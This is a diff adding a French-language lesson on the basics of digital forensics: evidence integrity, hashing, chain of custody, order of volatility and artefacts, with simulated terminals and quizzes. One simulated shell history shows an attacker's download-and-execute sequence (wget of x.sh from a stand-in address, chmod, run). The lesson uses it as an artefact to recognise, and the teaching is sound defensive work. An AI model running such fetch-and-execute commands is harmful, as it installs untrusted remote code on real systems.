@@ -1,0 +1,113 @@
+---
+refCode: CL-LSN-143-V01
+slug: blueteam-forensics
+title: "Investigation numérique : les bases"
+description: "Après un incident, reconstituer les faits sans détruire les preuves : préserver l'intégrité, tenir la chaîne de possession, respecter l'ordre de volatilité, et reconnaître les artefacts qui racontent l'attaque."
+category: CYBERSEC
+difficulty: ADVANCED
+estimatedMinutes: 40
+xpReward: 540
+prerequisites: ["CL-LSN-139-V01"]
+---
+
+Un serveur a été compromis cette nuit. À 8h, on te demande de comprendre ce qui s'est passé. La machine est encore allumée, des collègues ont déjà tapé deux ou trois commandes dessus pour vérifier, et quelqu'un propose de la redémarrer pour la nettoyer. C'est exactement le moment où tout peut basculer.
+
+Une machine compromise, c'est une scène de crime. Pas au sens dramatique : au sens pratique. Ce que tu vas pouvoir affirmer plus tard dépend entièrement de la manière dont tu traites cette scène dans les premières minutes. Un enquêteur qui marche partout, déplace les objets et touche tout à mains nues détruit les indices avant même de les lire. En numérique, c'est pareil, sauf que les traces sont plus discrètes et disparaissent plus vite.
+
+L'investigation numérique, ou forensics, c'est la discipline qui consiste à reconstituer des faits à partir de traces, tout en gardant ces traces utilisables, y compris devant un tribunal. Deux idées vont revenir sans arrêt : ne rien abîmer, et pouvoir prouver qu'on n'a rien abîmé.
+
+## préserver l'intégrité
+
+Première règle, celle dont tout le reste découle : on ne travaille jamais sur l'original.
+
+Tu ne fouilles pas le disque de la machine touchée. Tu en fais une copie exacte, bit par bit, et tu enquêtes sur la copie. L'original, tu le ranges et tu n'y touches plus. Pourquoi tant de prudence ? Parce que ouvrir un fichier modifie sa date de dernier accès. Lancer un programme écrit dans les journaux. Brancher un disque peut déclencher une indexation automatique. Chaque action que tu fais sur l'original écrase potentiellement une trace laissée par l'attaquant. Tu ne sais pas encore ce qui compte, donc tu ne peux pas te permettre d'effacer quoi que ce soit.
+
+Comment prouver que ta copie est bien identique à l'original ? Avec une empreinte, ce qu'on appelle un hash. On calcule l'empreinte de l'original, l'empreinte de la copie, et si les deux sont identiques, la copie est fidèle au bit près. C'est le même mécanisme que la leçon sur le hachage : la moindre différence, ne serait-ce qu'un octet, change complètement l'empreinte.
+
+<Callout type="danger">
+Une preuve manipulée sans précaution perd toute valeur. Si tu as ouvert, déplacé ou modifié l'original, la défense au tribunal dira que tu as pu fabriquer ou altérer l'indice, et elle aura raison de le dire. Une trace que tu ne peux pas garantir intacte ne prouve rien.
+</Callout>
+
+## la chaîne de possession
+
+Avoir une copie intègre ne suffit pas. Il faut aussi pouvoir raconter la vie de la preuve, du moment où elle a été saisie jusqu'au moment où elle est présentée.
+
+La chaîne de possession, c'est le registre qui répond à quatre questions, à chaque étape : qui a touché la preuve, quand, pourquoi, et ce qu'il en a fait. Qui a copié le disque, à quelle heure, avec quel outil. Qui a transporté la copie, où elle a été stockée, qui y a eu accès. Chaque passage de main est noté et signé.
+
+Sans ce registre, une preuve devient contestable. Imagine un disque qui reste deux jours sur un bureau ouvert, sans trace de qui est passé à côté. La question tombe : est-ce que quelqu'un a pu y ajouter des fichiers entre temps ? Tu ne peux pas répondre, donc le doute profite à l'accusé. La chaîne de possession existe pour fermer cette porte. Elle ne rend pas la preuve plus vraie, elle rend impossible de prétendre qu'elle a été trafiquée en chemin.
+
+## l'ordre de volatilité
+
+Maintenant la question du temps. Toutes les traces ne durent pas la même chose. Certaines s'évaporent en quelques secondes, d'autres restent des mois sur un disque. La règle : on capture d'abord ce qui disparaît le plus vite.
+
+La mémoire vive (RAM) contient les processus en cours, les connexions réseau ouvertes, parfois des clés de chiffrement ou des mots de passe en clair. Tout cela vit uniquement tant que la machine est allumée. Tu éteins, c'est perdu pour toujours. Le disque dur, lui, survit à un redémarrage. Donc on commence par le plus fragile.
+
+<Callout type="warning">
+Éteindre ou redémarrer une machine compromise efface la mémoire vive, les processus actifs et les connexions réseau. C'est souvent là que se trouve la preuve la plus parlante : le programme de l'attaquant en train de tourner, la connexion vers son serveur. Avant de couper quoi que ce soit, capture le volatile.
+</Callout>
+
+Du plus fugace au plus durable, voici l'ordre dans lequel on collecte :
+
+| Niveau | Type de trace | Durée de vie |
+|--------|--------------|--------------|
+| 1 | Registres et cache du processeur | millisecondes |
+| 2 | Mémoire vive : processus, connexions réseau | jusqu'à l'extinction |
+| 3 | Fichiers temporaires, sessions actives | minutes à heures |
+| 4 | Disque dur : fichiers, journaux | longue |
+| 5 | Sauvegardes, archives, journaux distants | très longue |
+
+Tu descends ce tableau dans l'ordre. On capture la mémoire avant de toucher au disque, jamais l'inverse.
+
+## les artefacts utiles
+
+Une fois la copie en main, qu'est-ce qu'on regarde ? Les artefacts, c'est-à-dire les traces qu'un système laisse naturellement de son activité. Quelques familles à connaître.
+
+Les journaux (logs) racontent les connexions, les erreurs, les services qui démarrent. L'historique des commandes montre ce qui a été tapé dans le terminal, souvent une mine d'or : les attaquants téléchargent et exécutent leurs outils en ligne de commande. Les fichiers récemment modifiés pointent vers ce qui a été déposé ou changé. La liste des processus révèle ce qui tourne, y compris ce qui ne devrait pas. Les connexions réseau montrent vers où la machine parle. Les comptes utilisateurs et leurs dernières connexions disent qui s'est connecté et quand.
+
+Voici une collecte typique sur une copie de travail. On note l'empreinte du disque copié, puis on lit quelques artefacts.
+
+<SimulatedTerminal shell="bash" scenario="bash" title="Collecter des artefacts (copie de travail)" commands={{"sha256sum disk.img": "9f2b...e41 disk.img", "ls -la --time-style=full-iso /home/user": "-rw-r--r-- 2026-01-10 03:14:00 .bash_history", "cat /home/user/.bash_history | tail -3": "wget http://203.0.113.9/x.sh\nchmod +x x.sh\n./x.sh", "who -a": "user pts/0 2026-01-10 03:12"}} />
+
+Lis ce que ça raconte. À 3h12, un utilisateur ouvre une session. Deux minutes plus tard, l'historique montre un téléchargement depuis une adresse externe, le fichier rendu exécutable, puis lancé. Tu tiens un début de récit : quand, par où, et avec quel outil l'attaque s'est déroulée. Les horodatages cohérents entre les artefacts renforcent l'histoire.
+
+## l'empreinte comme preuve
+
+Reviens sur le hash, parce qu'il sert deux fois. La première, on l'a vu : prouver que la copie est fidèle à l'original au moment de la saisie.
+
+La seconde vient plus tard. Trois semaines après, on te demande de confirmer que la preuve sur laquelle tu as travaillé n'a pas changé depuis. Tu recalcules l'empreinte de la copie. Si elle correspond à celle notée le premier jour, dans le registre de chaîne de possession, c'est mathématiquement la même donnée. Personne n'a ajouté, retiré ni modifié un seul octet. Si l'empreinte diffère, tu le sais immédiatement, et tu sais que cette preuve ne peut plus servir.
+
+C'est pour ça que l'empreinte se note dès le départ et se garde précieusement. Elle est le sceau qui rend la falsification détectable.
+
+## la rigueur paie
+
+Il y a une tension permanente en investigation : on voudrait aller vite, comprendre tout de suite, et la pression d'un incident pousse à bâcler. Résiste.
+
+Une preuve mal manipulée ne vaut rien. Pas presque rien : rien. Devant un tribunal, un avocat n'a pas besoin de démontrer que tu as triché, il lui suffit de montrer que tu aurais pu, parce que la procédure n'a pas été suivie. À ce moment, des semaines de travail s'effondrent. Mieux vaut une investigation lente et propre qu'une investigation rapide et inutilisable.
+
+<Callout type="success">
+La discipline n'est pas un frein, c'est ce qui donne du poids à ton travail. Copie d'abord, note tout, capture le volatile en premier, scelle avec une empreinte. Une enquête qui respecte ces gestes produit des conclusions qu'on ne peut pas balayer d'un revers de main.
+</Callout>
+
+## à toi de jouer
+
+Tu arrives sur une machine compromise, encore allumée. Avant de penser au disque, tu captures ce qui s'évapore : la mémoire, les processus, les connexions. Puis tu scelles avec une empreinte.
+
+<SimulatedTerminal shell="bash" scenario="bash" title="Réflexes des premières minutes" commands={{"netstat -tunp": "tcp 192.168.1.20:51000 203.0.113.9:443 ESTABLISHED 4127/x.sh", "ps aux | grep x.sh": "user 4127 0.6 ./x.sh", "sha256sum mem.dump": "3a7c...b92 mem.dump", "last -n 2": "user pts/0 2026-01-10 03:12 still logged in"}} />
+
+<Quiz id="q-1" question="Pourquoi enquête-t-on sur une copie du disque plutôt que sur l'original ?" options={["Parce que la copie est plus rapide à lire", "Parce que toute action sur l'original peut écraser des traces et le rendre contestable", "Parce que l'original est trop volumineux", "Parce que la copie contient plus de données"]} correct={1} />
+
+<Quiz id="q-2" question="Dans quel ordre faut-il collecter les traces après un incident ?" options={["Le disque d'abord, la mémoire vive ensuite", "Peu importe, l'ordre n'a aucune incidence", "Le plus volatile d'abord : mémoire vive et connexions avant le disque", "Les sauvegardes distantes en premier"]} correct={2} />
+
+<Quiz id="q-3" question="À quoi sert de recalculer l'empreinte (hash) d'une preuve plusieurs semaines plus tard ?" options={["À accélérer l'analyse", "À prouver que la copie n'a pas été modifiée depuis sa saisie", "À chiffrer la preuve", "À compresser le fichier"]} correct={1} />
+
+## à retenir
+
+- Une machine compromise est une scène de crime : ce que tu pourras prouver dépend de la rigueur des premières minutes.
+- On ne travaille jamais sur l'original. On en fait une copie bit à bit et on enquête sur la copie.
+- L'empreinte (hash) prouve qu'une copie est identique à l'original, et qu'elle n'a pas bougé depuis.
+- La chaîne de possession note qui a touché la preuve, quand et comment. Sans elle, la preuve est contestable.
+- Ordre de volatilité : on capture d'abord ce qui disparaît vite (mémoire vive, processus, connexions) avant le disque. Éteindre efface le volatile.
+- Artefacts utiles : journaux, historique de commandes, fichiers récents, processus, connexions, comptes.
+- Une preuve mal manipulée ne vaut rien, surtout devant un tribunal. Bien faire prime sur faire vite.
+
+OK 11 écrit
